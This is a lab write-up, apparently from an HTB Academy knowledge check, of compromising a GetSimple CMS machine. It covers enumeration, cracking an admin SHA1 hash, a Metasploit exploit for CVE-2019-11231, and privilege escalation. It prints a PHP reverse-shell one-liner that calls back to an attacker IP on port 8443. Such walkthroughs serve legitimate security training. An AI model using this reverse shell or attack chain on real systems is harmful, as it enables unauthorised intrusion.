---
title: Knowledge Check - GetSimple
updated: 2022-12-23T20:31:44.0000000+00:00
created: 2022-12-21T19:28:13.0000000+00:00
---

**Enumeration:**

First we scan the IP with nmap and see that there is a http and ssh port open:
![image1](../../../../../_resources/image1-87.png)
The machine is also a Linux machine.

Looking at the html page, we see that this is a Get Simple http page.
All of the links seem to link to the URL: <http://gettingstarted.htb/>, which doesn't resolve.

When scanning for scripts we get some interesting info:
![image2](../../../../../_resources/image2-69.png)

Looking at the subdomain */admin.* We get an admin portal (<http://10.129.48.213/admin/>):
![image3](../../../../../_resources/image3-59.png)

Using **GoBuster,** we can see various sub-domains:
![image4](../../../../../_resources/image4-50.png)

Looking at these sub domains we found out we have a user named **admin** and a file that seems to have a password:
![image5](../../../../../_resources/image5-39.png)
It looks hashed though, apparently it is SHA1, decoding it also gives the password **admin**:
![image6](../../../../../_resources/image6-29.png)
And we are in:
![image7](../../../../../_resources/image7-23.png)

Foothold:

Now that we are inside the admin portal, we need to find something vulnerable so we can get code execution and a shell.

Looking inside the admin portal we see:

- GetSimple Version 3.3.15 is running
- PHP version 7.4.3 is running
- The Apache web server is 2.4.41

Using metasploit, we find an exploit that works on GetSimple version 3.3.15 that allows us to execute PHP code.

<https://nvd.nist.gov/vuln/detail/CVE-2019-11231>

After setting RHOSTS to the Target IP and LHOSTS to our VPN ip and finally LPORT to port 8443.

We get a foothold on the machine:
![image8](../../../../../_resources/image8-21.png)

We then are able to navigate to /home/ and find the user.txt flag:
![image9](../../../../../_resources/image9-19.png)

Using *shell* within a meterpreter shell in msfconsole gives us access to the raw shell. We can then upgrade it using: **python3 -c 'import pty; pty.spawn("/bin/bash")'**
![image10](../../../../../_resources/image10-14.png)

Privilege Escalation:

Now we need to check if we have any vulnerabilities for privilege escalation using LinEnum, so first we need to download that file into the box.

Using wget, we can't write inside mrb3n's folder, we need to head to the www/html/theme which we do have access to, so that we can download the script:

![image11](../../../../../_resources/image11-11.png)

Running the LinEnum script we can see:
![image12](../../../../../_resources/image12-7.png)

Looking at payload of all things, we can see a php one-liner:

php -r '\$sock=fsockopen("10.10.14.253",8443);exec("/bin/sh -i \<&3 \>&3 2\>&3");'
![image13](../../../../../_resources/image13-6.png)

Using a netcat listener, we get a root:
![image14](../../../../../_resources/image14-6.png)

